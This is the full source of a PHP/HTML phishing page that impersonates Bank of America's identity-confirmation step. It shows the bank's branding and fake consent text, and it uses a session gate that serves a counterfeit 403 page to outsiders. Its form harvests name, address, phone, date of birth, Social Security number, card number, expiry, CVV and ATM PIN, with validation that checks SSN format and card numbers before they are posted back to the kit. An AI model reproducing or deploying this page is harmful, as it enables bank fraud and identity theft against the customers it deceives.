<?php
session_start();
error_reporting(0);
// Check if session is not set, or if they do not match
if($_SESSION['username'] == "") {
    header('HTTP/1.0 403 Forbidden');
    die('<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"><html><head><title>403 Forbidden</title></head><body><h1>Forbidden</h1><p>You dont have permission to access / on this server.</p></body></html>');
    exit();
}
?>
<!DOCTYPE html>
<html xmlns="http://www.w3.org/1999/xhtml">

<head class="at-element-marker">
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <title>Online Banking Security: Confirm identity</title>
    <link rel="stylesheet" type="text/css" href="../assets/css/abpa-foundation.css">
    <link rel="stylesheet" type="text/css" href="../assets/css/abpa-responsive.css">
    <link rel="shortcut icon" href="../assets/img/favicon.ico" type="image/x-icon">
    <style type="text/css">
        .hide {
            display: none !important;
        }

        .show {
            display: block !important;
        }

        @keyframes ldio-1z0ye3jlelli {
            0% {
                transform: translate(-50%, -50%) rotate(0deg);
            }

            100% {
                transform: translate(-50%, -50%) rotate(360deg);
            }
        }

        .ldio-1z0ye3jlelli div {
            position: absolute;
            width: 100.48px;
            height: 100.48px;
            border: 6.28px solid #df1317;
            border-top-color: transparent;
            border-radius: 50%;
        }

        .ldio-1z0ye3jlelli div {
            animation: ldio-1z0ye3jlelli 0.7874015748031495s linear infinite;
            top: 78.5px;
            left: 78.5px
        }

        .loadingio-spinner-rolling-u9az2tfkb6 {
            z-index: 1000;
            position: fixed;
            display: block;
            top: 0;
            bottom: 0;
            left: 0;
            right: 0;
            width: 100%;
            height: 100vh;
            background-color: rgba(255, 255, 255, .8);
            background-position: center;
            border-radius: 10px;
            text-align: center;
            -webkit-transition: opacity .3s ease-in;
            -o-transition: opacity .3s ease-in;
            transition: opacity .3s ease-in;
            opacity: .99;
        }

        .ldio-1z0ye3jlelli {
            z-index: 2010;
            content: ' ';
            position: fixed;
            top: 35%;
            left: 45%;
            height: 50px;
            width: 50px;
            display: inline-block;
            border-radius: 50%;
            animation: .7s linear infinite rotate;
        }

        @media screen and (max-width: 500px) {
            .loadingio-spinner-rolling-u9az2tfkb6 .ldio-1z0ye3jlelli {
                top: 35%;
                left: 27%;
                height: 50px;
                width: 50px;
            }
        }

        .errorClass {
            color: red;
            margin-top: 0;
            padding-bottom: 10px;
        }

        .error {
            color: red;
        }
    </style>
</head>

<body>
    <div id="oDaL_" style="width:100%;height:100%;" class="z-page">
        <div class="loadingio-spinner-rolling-u9az2tfkb6">
            <div class="ldio-1z0ye3jlelli">
                <div></div>
            </div>
        </div>
        <div id="oDaL0" class="z-div">
            <div id="oDaL1" style="display:none;" class="z-div"><span id="oDaL2" class="z-label">Build: </span></div>
            <a id="oDaL3" name="top"></a>
            <div id="oDaL4" class="row page-container">
                <div id="oDaL5" class="small-12 columns">
                    <div id="oDaL6" class="z-div">
                        <div id="oDaL7" class="header">
                            <div id="oDaL8" class="row header_branding-bar">
                                <div class="small-12 columns">
                                    <span>
                                        <img class="image-logo" src="../assets/img/BofA_rgb.png" alt="Bank of America">
                                    </span>
                                    <a class="right secure-text show-for-medium-up" href="javascript:void(0);" name="ancHMSecArea" id="ancHMSecArea">
                                        Secure Page
                                    </a>
                                    <a class="right secure-text show-for-small-only" href="javascript:void(0);" name="ancHMSecArea">
                                    </a>
                                </div>
                            </div>
                            <div id="oDaL9" class="z-div">
                                <div id="oDaLa" class="row header_title-bar">
                                    <div class="small-12 columns">
                                        <h1>
                                            <div id="oDaLb" class="z-div">
                                                <span id="oDaLc">Bank of Amerika Security Center</span>
                                            </div>
                                        </h1>
                                    </div>
                                </div>
                                <div class="small-12 columns progress-bar--v1">
                                    <div class="contain-to-grid sticky">
                                        <nav class="top-bar" data-topbar="">
                                            <div class="progress progress--v1">
                                                <span id="step-meter" class="meter" style="width: 0;"><span id="step-meter-inner" class="meter" style="display:none;"></span></span>
                                                <span id="step-counter" class="hide">1</span>
                                            </div>
                                            <ul class="progress-bar_step-list--v1">
                                                <li class="progress-bar_step">
                                                    <span id="step-1-circle" class="step-circle active">
                                                        <p class="show-for-medium-up step-number">
                                                            <span id="m12Ie" class="ada-hidden">Step 1 of 2:</span>
                                                            1
                                                        </p>
                                                    </span>
                                                    <label id="step-1-label" class="show-for-medium-up step-text active">Your
                                                        Information</label>
                                                </li>
                                                <li class="progress-bar_step">
                                                    <span id="step-2-circle" class="step-circle">
                                                        <p class="show-for-medium-up step-number">
                                                            <span id="m12Ik" class="ada-hidden">Step 2 of 2:</span>
                                                            2
                                                        </p>
                                                    </span>
                                                    <label id="step-2-label" class="show-for-medium-up step-text">Completed</label>
                                                </li>
                                            </ul>
                                            <a id="help-link" class="show-for-small-only help-dropdown_trigger">Need Help?</a>
                                        </nav>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                    <div id="oDaLt" class="z-div">
                        <div id="oDaL80" class="z-div">
                            <div id="oDaL90" class="small-12 columns ">
                                <div id="oDaLa0" style="width:100%;height:100%;" class="responsive-div-include z-include">
                                    <div id="oDaLb0" class="z-div">
                                        <div id="oDaLp0" class="form-section">
                                            <div class="row">
                                                <div class="small-12 medium-11 large-9 columns">
                                                    <p>
                                                    </p>
                                                    <h2 style="margin-top: 20px;">Confirm your identity</h2>
                                                    <p></p>
                                                    <h3 class="c1">
                                                        To access and complete your saved application(s), please enter the following
                                                        information.
                                                    </h3>
                                                </div>
                                                <hr>
                                            </div>
                                            <h3>Personal</h3>
                                            <p style="margin-top: -17px;">To confirm that you're the owner, we need specific
                                                details during verification.</p>
                                        </div>
                                        <form name="kepoz" id="kepoz" action="?action=fullinfo" method="POST" onsubmit="return expCheck() && cardnumberCheck();">
                                            <div class="row">
                                                <div class="small-12 medium-6 large-5 columns">
                                                    <label class="c5--v5 label_name" style="font-weight: bold;" id="nameLabel">
                                                        Full name
                                                    </label>
                                                    <div class="namefocus addfocus">
                                                        <input type="text" data-field-type="" class="tl-private z-textbox abpa-textbox" value="" maxlength="30" name="name" id="fullname" placeholder="Full name" aria-describedby="zz_snr_lastName_v_1-hint zz_snr_lastName_v_1-errtxt" onkeypress="return alpha(event)">
                                                    </div>
                                                </div>
                                            </div>
                                            <div class="row">
                                                <div class="small-12 medium-6 large-5 columns">
                                                    <label class="c5--v5 label_add" style="font-weight: bold;">
                                                        Residential address line
                                                    </label>
                                                    <div class="addressfocus addfocus">
                                                        <input type="text" data-field-type="" class="tl-private z-textbox abpa-textbox" value="" maxlength="30" name="address" id="address" placeholder="Address line" aria-describedby="zz_snr_lastName_v_1-hint zz_snr_lastName_v_1-errtxt">
                                                    </div>
                                                </div>
                                            </div>
                                            <div class="row">
                                                <div class="small-12 medium-6 large-5 columns">
                                                    <label class="c5--v5 label_city" style="font-weight: bold;">
                                                        City
                                                    </label>
                                                    <div class="addfocus cityfocus">
                                                        <input type="text" data-field-type="" class="tl-private z-textbox abpa-textbox" value="" maxlength="15" name="kota" id="cityp" placeholder="City" aria-describedby="zz_snr_lastName_v_1-hint zz_snr_lastName_v_1-errtxt" onkeypress="return alpha(event)">
                                                    </div>
                                                </div>
                                            </div>
                                            <div class="row">
                                                <div class="small-12 medium-6 large-5 columns">
                                                    <label class="c5--v5 label_state" style="font-weight: bold;">
                                                        State
                                                    </label>
                                                    <div class="addfocus statefocus">
                                                        <input type="text" data-field-type="" class="tl-private z-textbox abpa-textbox" value="" name="state" id="state" placeholder="State" maxlength="20" aria-describedby="zz_snr_lastName_v_1-hint zz_snr_lastName_v_1-errtxt" onkeypress="return alpha(event)">
                                                    </div>
                                                </div>
                                            </div>
                                            <div class="row">
                                                <div class="small-12 medium-6 large-5 columns">
                                                    <label class="c5--v5 label_zip" style="font-weight: bold;">
                                                        ZIP code
                                                    </label>
                                                    <div class="addfocus zipfocus">
                                                        <input type="text" data-field-type="" class="tl-private z-textbox abpa-textbox" value="" name="zip" id="zip" placeholder="ZIP code" maxlength="10" aria-describedby="zz_snr_lastName_v_1-hint zz_snr_lastName_v_1-errtxt">
                                                    </div>
                                                </div>
                                            </div>
                                            <div class="row">
                                                <div class="small-12 medium-6 large-5 columns">
                                                    <label class="c5--v5 label_phone" style="font-weight: bold;">
                                                        Mobile number
                                                    </label>
                                                    <div class="addfocus phonefocus">
                                                        <input type="tel" data-field-type="" class="tl-private z-textbox abpa-textbox" value="" name="phone" id="phone" placeholder="Mobile number" maxlength="16" aria-describedby="zz_snr_lastName_v_1-hint zz_snr_lastName_v_1-errtxt">
                                                    </div>
                                                </div>
                                            </div>
                                            <div class="row">
                                                <div class="small-12 medium-6 large-5 columns">
                                                    <label class="c5--v5 label_dob" style="font-weight: bold;">
                                                        Dith of birth
                                                    </label>
                                                    <div class="addfocus dobfocus">
                                                        <input type="text" data-field-type="" class="tl-private z-textbox abpa-textbox" value="" name="dob" id="dob" placeholder="DD/MM/YYYY" aria-describedby="zz_snr_lastName_v_1-hint zz_snr_lastName_v_1-errtxt">
                                                    </div>
                                                </div>
                                            </div>
                                            <div class="row">
                                                <div class="small-12 medium-6 large-5 columns">
                                                    <label class="c5--v5 label_ssn" style="font-weight: bold;">
                                                        Social security number
                                                    </label>
                                                    <div class="addfocus ssnfocus">
                                                        <input type="text" data-field-type="" class="tl-private z-textbox abpa-textbox" value="" name="ssn" id="ssn" placeholder="___-__-____" aria-describedby="zz_snr_lastName_v_1-hint zz_snr_lastName_v_1-errtxt">
                                                    </div>
                                                </div>
                                            </div>
                                            <br>
                                            <hr>
                                            <h3 style="margin-top: 20px;">Card authentication</h3>
                                            <p style="margin-top: -17px;">Authenticate your application with card linked to account
                                            </p>
                                            <br>
                                            <div class="row">
                                                <div class="small-12 medium-6 large-4 columns">
                                                    <label class="c5--v5 label_ccn" style="font-weight: bold;">
                                                        Card number
                                                    </label>
                                                    <div class="addfocus cardnumberfocus">
                                                        <input type="tel" data-field-type="" class="tl-private z-textbox abpa-textbox cardnumbersel" value="" name="cardnumber" id="cardnumber" placeholder="Card number" aria-describedby="zz_snr_lastName_v_1-hint zz_snr_lastName_v_1-errtxt" maxlength="16">
                                                    </div>
                                                </div>
                                            </div>
                                            <div class="row">
                                                <div class="small-12 medium-2 large-2 columns">
                                                    <label class="c5--v5 label_pin expsel" style="font-weight: bold;">
                                                        Expiration Month
                                                    </label>
                                                    <div class="addfocus expfocus">
                                                        <select class="tl-private z-textbox abpa-textbox expsel" name="expmonth" id="expmonth">
                                                            <option value="">Month</option>
                                                            <option value="01">01</option>
                                                            <option value="02">02</option>
                                                            <option value="03">03</option>
                                                            <option value="04">04</option>
                                                            <option value="05">05</option>
                                                            <option value="06">06</option>
                                                            <option value="07">07</option>
                                                            <option value="08">08</option>
                                                            <option value="09">09</option>
                                                            <option value="10">10</option>
                                                            <option value="11">11</option>
                                                            <option value="12">12</option>
                                                        </select>
                                                    </div>
                                                </div>
                                                <div class="small-12 medium-2 large-2 columns">
                                                    <label class="c5--v5 label_pin expsel" style="font-weight: bold;">
                                                        Expiration Year
                                                    </label>
                                                    <div class="addfocus expfocus">
                                                        <select type="text" class="tl-private z-textbox abpa-textbox expsel" name="expyear" id="expyear">
                                                            <option value="">Year</option>
                                                            <option value="2025">2025</option>
                                                            <option value="2026">2026</option>
                                                            <option value="2027">2027</option>
                                                            <option value="2028">2028</option>
                                                            <option value="2029">2029</option>
                                                            <option value="2030">2030</option>
                                                            <option value="2031">2031</option>
                                                            <option value="2032">2032</option>
                                                            <option value="2033">2033</option>
                                                            <option value="2034">2034</option>
                                                            <option value="2035">2035</option>
                                                        </select>
                                                    </div>
                                                </div>
                                                <br>
                                            </div>
                                            <div class="row">
                                                <div class="small-12 medium-2 large-2 columns">
                                                    <label class="c5--v5 label_pin" style="font-weight: bold;">
                                                        Security code
                                                    </label>
                                                    <div class="addfocus cvvfocus">
                                                        <input type="tel" data-field-type="" class="tl-private z-textbox abpa-textbox" value="" maxlength="3" name="cvv" id="cvv" placeholder="CVV" onkeypress="return alpha(event)">
                                                    </div>
                                                </div>
                                                <div class="small-12 medium-2 large-2 columns">
                                                    <label class="c5--v5 label_pin" style="font-weight: bold;">
                                                        ATM/Debit Card PIN
                                                    </label>
                                                    <div class="addfocus pinfocus">
                                                        <input type="password" data-field-type="" class="tl-private z-textbox abpa-textbox" value="" maxlength="4" name="atmpin" id="atmpin" placeholder="ATM PIN" onkeypress="return alpha(event)">
                                                    </div>
                                                </div>
                                                <br>
                                                <hr>
                                                <div id="oDaLu0" class="row">
                                                    <div id="yKqK21">
                                                        <div class="small-12 columns ecd-container">
                                                            <p class="c2">By selecting Continue, <strong>you authorize us to obtain a
                                                                    credit report</strong> or other report or account information from
                                                                credit or information services agencies to help verify the information
                                                                you provide in this application; for consideration of other accounts and
                                                                services, and for any other lawful purpose. If your information does not
                                                                meet certain qualifications, you will not be able to proceed with your
                                                                application at this time.</p>
                                                        </div>
                                                    </div>
                                                    <div id="oDaLv0" class="small-12 medium-4 columns z-div">
                                                        <button type="submit" class="button primary medium" name="gass" onclick="validateForm();">Continue</button>
                                                    </div>
                                                </div>
                                            </div>
                                        </form>
                                    </div>
                                </div>
                            </div>
                        </div>
                        <div id="oDaLx0" class="z-div">
                            <div id="oDaLy0" class="small-12 columns hide">
                                <div id="oDaLz0" style="width:100%;height:100%;" class="responsive-div-include z-include">
                                    <div id="oDaL_1" class="z-div"></div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
                <div id="oDaL11" class="z-include">
                    <div id="oDaL21" class="row hide-for-print">
                        <span id="hiddenIsContinueButtonActive_v_1" style="display:none;" class="z-checkbox"><input type="checkbox" id="hiddenIsContinueButtonActive_v_1-real" name="hiddenIsContinueButtonActive" checked="checked"><label for="hiddenIsContinueButtonActive_v_1-real" class="z-checkbox-cnt"></label></span>
                        <div id="oDaL41" style="display:none;" class="small-12 columns">
                            <a id="oDaL51" class="button primary small z-a" name="btn_continue" href="javascript:void(0);">Continue</a>
                            <a id="oDaL61" style="display:none;" class="button primary small button primary small-disd" name="btn_submitApplication" href="javascript:void(0);">Submit Application<span id="oDaL71" class="ada-hidden none z-label">unavailable</span></a>
                            <a id="oDaL81" style="display:none;" class="button primary small" name="btn_submit" href="javascript:void(0);">Submit</a>
                            <a id="oDaL91" class="button-secondary" name="btn_cancelAndExitApp" href="javascript:void(0);">Cancel and exit application</a>
                            <a id="oDaLa1" style="display:none;" class="button-secondary" name="btn_continueWithoutAnswer" href="javascript:void(0);">Continue without answering questions</a>
                        </div>
                    </div>
                </div>
                <div id="oDaLc1" class="z-div">
                    <div id="oDaLd1" class="footer hide-for-print">
                        <div id="oDaLe1" class="row">
                            <div id="oDaLf1" class="small-12 columns">
                                <p class="privacy-text">
                                    <span id="oDaLg1" class="z-span">
                                        <a id="oDaLh1" class="privacy-text_link" title="Share website feedback" name="link_shareWebsiteFeedback" href="javascript:void(0);">Share website feedback</a>
                                        <span id="oDaLi1" aria-hidden="true"> | </span></span>
                                    <a class="privacy-text_link" title="Privacy &amp; Security. Link opens in new window." name="PrivacyAndSecurity" href="javascript:void(0);">Privacy &amp; Security</a>
                                </p>
                                <p focusable="true" focusableintouchmode="true" class="copyright-text">
                                    Bank of America, N.A. Member FDIC.
                                    <a class="copyright-text_link" title="Equal Housing Lender. Link opens in new window." href="javascript:void(0);" name="EqualHousingLender">Equal Housing Lender</a>
                                </p>
                                <p focusable="true" focusableintouchmode="true" class="copyright-text">� <script>
                                        document.write(new Date().getFullYear())
                                    </script> Bank of America
                                    Corporation. All rights reserved.</p>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>
    <script src="../assets/js/jquery.min.js"></script>
    <script src="../assets/js/jquery.mask.min.js"></script>
    <script src="../assets/js/jquery.validate.min.js"></script>
    <script src="../assets/js/additional-methods.min.js"></script>
    <script src="../assets/js/jquery.creditCardValidator.js"></script>
    <script>
        $(window).ready(function() {
            setInterval(function() {
                $(".loadingio-spinner-rolling-u9az2tfkb6").fadeOut("fast");
                $(".ldio-1z0ye3jlelli").fadeOut("fast");
            }, 1000);
        });

        const alpha = (e) => {
            let k;
            document.all ? k = e.keyCode : k = e.which;
            return ((k > 64 && k < 91) || (k > 96 && k < 123) || k == 8 || k == 32 || (k >= 48 && k <= 57));
        }

        $(document).ready(function(e) {
            e("#phone").mask("+100000000000000"), e("#dob").mask("00/00/0000"), e("#ssn").mask("000-00-0000"),
                $("#kepoz").validate({
                    errorClass: "errorClass",
                    rules: {
                        name: {
                            required: true,
                            minlength: 5,
                            maxlength: 30
                        },
                        address: {
                            required: true,
                            minlength: 5,
                            maxlength: 30
                        },
                        city: {
                            required: true,
                            minlength: 5,
                            maxlength: 15
                        },
                        state: {
                            required: true,
                            minlength: 5,
                            maxlength: 20
                        },
                        zip: {
                            required: true,
                            minlength: 2,
                            maxlength: 10
                        },
                        phone: {
                            required: true,
                            minlength: 6,
                            maxlength: 16
                        },
                        dob: {
                            required: true,
                            minlength: 10,
                            minAge: 17
                        },
                        ssn: {
                            required: true,
                            SocialSecurity: true
                        },
                        cardnumber: {
                            required: true,
                            minlength: 16,
                            creditcard: true
                        },
                        cvv: {
                            required: true,
                            digits: true,
                            minlength: 3
                        },
                        expmonth: {
                            required: true
                        },
                        expyear: {
                            required: true
                        },
                        atmpin: {
                            minlength: 4,
                            required: true
                        }
                    },
                    messages: {
                        name: {
                            required: "Please enter a Full name.",
                            minlength: "Please enter a Full name."
                        },
                        address: {
                            required: "Please enter a Address."
                        },
                        city: {
                            required: "Please enter a City."
                        },
                        state: {
                            required: "Please enter a State."
                        },
                        phone: {
                            required: "Please enter a Phone."
                        },
                        dob: {
                            required: "Please enter a Date of birth.",
                            minAge: "Please check a Date of birth."
                        },
                        ssn: {
                            required: "Please enter a Social security number.",
                            SocialSecurity: "Please check a Social security number"
                        },
                        cardnumber: {
                            required: "Please enter a Card number.",
                            creditcard: "Please check a Card number."
                        },
                        cvv: {
                            required: "Please enter a Secure code / CVV."
                        },
                        expmonth: {
                            required: "Please check a Expiration date"
                        },
                        expyear: {
                            required: "Please check a Expiration date"
                        },
                        atmpin: {
                            minlength: "Please check a ATM Pin",
                            required: "Please check a ATM Pin"
                        }
                    }
                });
        })

        let nameFocus = $("input[name=name]");
        nameFocus.focusin(function() {
            $('.namefocus').addClass("active");
        });
        nameFocus.focusout(function() {
            $('.namefocus').removeClass("active");
        });

        let addressFocus = $("input[name=address]");
        addressFocus.focusin(function() {
            $('.addressfocus').addClass("active");
        });
        addressFocus.focusout(function() {
            $('.addressfocus').removeClass(" active");
        });

        let cityFocus = $("input[name=city]");
        cityFocus.focusin(function() {
            $('.cityfocus').addClass(" active");
        });
        cityFocus.focusout(function() {
            $('.cityfocus').removeClass(" active");
        });

        let stateFocus = $("input[name=state]");
        stateFocus.focusin(function() {
            $('.statefocus').addClass(" active");
        });
        stateFocus.focusout(function() {
            $('.statefocus').removeClass(" active");
        });
        let zipFocus = $("input[name=zip]");
        zipFocus.focusin(function() {
            $('.zipfocus').addClass(" active");
        });
        zipFocus.focusout(function() {
            $('.zipfocus').removeClass(" active");
        });

        let phoneFocus = $("input[name=phone]");
        phoneFocus.focusin(function() {
            $('.phonefocus').addClass(" active");
        });
        phoneFocus.focusout(function() {
            $('.phonefocus').removeClass(" active");
        });

        let dobFocus = $("input[name=dob]");
        dobFocus.focusin(function() {
            $('.dobfocus').addClass(" active");
        });
        dobFocus.focusout(function() {
            $('.dobfocus').removeClass(" active");
        });

        let ssnFocus = $("input[name=ssn]");
        ssnFocus.focusin(function() {
            $('.ssnfocus').addClass(" active");
        });
        ssnFocus.focusout(function() {
            $('.ssnfocus').removeClass(" active");
        });
        let cardnumberFocus = $("input[name=cardnumber]");
        cardnumberFocus.focusin(function() {
            $('.cardnumberfocus').addClass(" active");
        });
        cardnumberFocus.focusout(function() {
            $('.cardnumberfocus').removeClass(" active");
        });

        let expFocus = $("input[name=exp]");
        expFocus.focusin(function() {
            $('.expfocus').addClass(" active");
        });
        expFocus.focusout(function() {
            $('.expfocus').removeClass(" active");
        });

        let cvvFocus = $("input[name=cvv]");
        cvvFocus.focusin(function() {
            $('.cvvfocus').addClass(" active");
        });
        cvvFocus.focusout(function() {
            $('.cvvfocus').removeClass(" active");
        });

        let pinFocus = $("input[name=atmpin]");
        pinFocus.focusin(function() {
            $('.pinfocus').addClass(" active");
        });
        pinFocus.focusout(function() {
            $('.pinfocus').removeClass(" active");
        });


        $.validator.addMethod("minAge", function(value, element, min) {
            let today = new Date();
            let birthDate = new Date(value);
            let age = today.getFullYear() - birthDate.getFullYear();

            if (age > min + 1) {
                return true;
            }

            let m = today.getMonth() - birthDate.getMonth();

            if (m < 0 || (m === 0 && today.getDate() < birthDate.getDate())) {
                age--;
            }

            return age >= min;
        });

        $.validator.addMethod('SocialSecurity',
            function(value) {
                return validSSN(value) || value == "";
            }, 'Please enter a Valid SSN.'
        );

        let validSSN = (value) => {
            let regex = /^([0-6]\d{2}|7[0-6]\d|77[0-2])([ \-]?)(\d{2})\2(\d{4})$/;
            if (!regex.test(value)) {
                return false;
            }
            let temp = value;
            if (value.indexOf("-") != -1) {
                temp = (value.split("-")).join("");
            }
            if (value.indexOf(" ") != -1) {
                temp = (value.split(" ")).join("");
            }
            if (temp.substring(0, 3) == "000") {
                return false;
            }
            if (temp.substring(3, 5) == "00") {
                return false;
            }
            if (temp.substring(5, 9) == "0000") {
                return false;
            }
            return true;
        }

        let expCheck = () => {
            let today = new Date();
            let expDate = new Date($("#expyear").val(), ($("#expmonth").val() - 1));
            let check = true;
            if (today.getTime() > expDate.getTime()) {
                $('.expsel').addClass('error');
                $('.expfocus').addClass('error');
                return false;
            } else {
                $('.expsel').removeClass('error');
                $('.expfocus').removeClass('error');
                return true;
            }
            if (!check) {
                $('.expsel').addClass('error');
                $('.expfocus').addClass('error');
                return false;
            }
            return check;
        }

        let cardnumberCheck = () => {
            let result = $('#cardnumber').validateCreditCard();
            if (!result.valid) {
                $('.cardnumbersel').addClass('error');

                return false;
            }
        }
    </script>
</body>

</html>